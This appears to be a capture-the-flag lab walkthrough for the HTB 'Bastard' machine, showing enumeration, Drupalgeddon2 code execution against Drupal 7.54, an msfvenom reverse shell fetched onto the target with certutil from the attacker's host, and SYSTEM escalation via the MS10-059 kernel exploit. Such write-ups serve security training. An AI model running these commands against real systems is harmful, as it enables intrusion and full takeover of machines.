@@ -1,0 +1,97 @@
+Drupal - PHP - Win Server 2008 - Kernel Exploit MS10-059
+
+
+1-Enumeration:
+    nmap -T5 -Pn -sC -sV 10.10.10.9 -vv
+        PORT      STATE SERVICE REASON  VERSION
+        80/tcp    open  http    syn-ack Microsoft IIS httpd 7.5
+        135/tcp   open  msrpc   syn-ack Microsoft Windows RPC
+        49154/tcp open  msrpc   syn-ack Microsoft Windows RPC
+        Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+    gobuster dir -u http://10.10.10.9/ -r -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+
+    
+
+    http://10.10.10.9/CHANGELOG.txt
+
+    Drupal 7.54, 2017-02-01
+
+
+
+2-Exploit:
+    We will use drupalgeddon2 exploit:
+        https://github.com/dreadlocked/Drupalgeddon2
+
+        sudo gem install highline
+        ruby drupalgeddon2.rb http://10.10.10.9o 
+
+        drupalgeddon2>> whoami
+
+        nt authority\iusr
+
+        
+
+    Enumeration Windows:
+
+        drupalgeddon2>> systeminfo
+
+        Host Name:                 BASTARD
+        OS Name:                   Microsoft Windows Server 2008 R2 Datacenter
+
+        OS Version:                6.1.7600 N/A Build 7600
+        OS Manufacturer:           Microsoft Corporation
+
+        OS Build Type:             Multiprocessor Free
+        Registered Owner:          Windows User
+        BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+        Windows Directory:         C:\Windows
+        System Directory:          C:\Windows\system32
+        Boot Device:               \Device\HarddiskVolume1
+        Domain:                    HTB
+        Logon Server:              N/A
+        Hotfix(s):                 N/A
+
+        Version exploit: Microsoft Windows Server 2008 R2 Datacenter
+
+    
+
+    The shell is not stable we will use remote shell:
+
+    Kali:
+
+        msfvenom -p windows/shell_reverse_tcp LHOST=<KALI IP> LPORT=443 -f exe > remote.exe
+
+        nc -lvnp 443
+        python3 -m http.server 80
+
+        certutil -urlcache -f http://<KALI IP>/remote.exe remote.exe
+
+        certutil -urlcache -f http://10.6.1.162/remote.exe remote.exe
+
+    Enumeration Windows 2:
+        We test the PentestMonkey windows Enum:
+            https://github.com/pentestmonkey/windows-privesc-check
+            https://github.com/pentestmonkey/windows-privesc-check/blob/master/docs/QuickStartUsage.md
+
+            C:\inetpub\drupal-7.54>.\winpriv.exe --audit -a -o wpc-report
+
+            C:\inetpub\drupal-7.54>type wpc-report.txt
+        
+        or   windows-exploit-suggester.py
+
+        
+        
+        Following the report we found Kernel Exploit MS10-059:
+            https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe
+
+            We upload into the machine via "certutil"
+            We create a nc -lvnp <Port>
+
+        Exploit of MS10-059:
+            .\MS10-059.exe <Kali IP> <Port>
+
+        New shell:
+            whoami
+            nt Authority\System
